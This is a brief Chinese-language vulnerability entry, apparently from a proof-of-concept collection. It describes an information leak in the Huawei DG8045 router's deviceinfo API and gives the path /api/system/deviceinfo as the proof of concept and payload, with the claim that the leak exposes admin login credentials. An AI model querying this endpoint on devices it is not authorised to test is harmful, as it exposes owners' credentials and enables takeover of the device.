# Huawei DG8045 deviceinfo 信息泄漏漏洞

## 漏洞描述
Huawei DG8045 deviceinfo api接口存在信息泄漏漏洞，攻击者通过泄漏的信息可以获得账号密码登录后台

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面

![image-20220519181753641](images/202205191817718.png)

验证POC

```
/api/system/deviceinfo
```


## Payloads
```
/api/system/deviceinfo
```
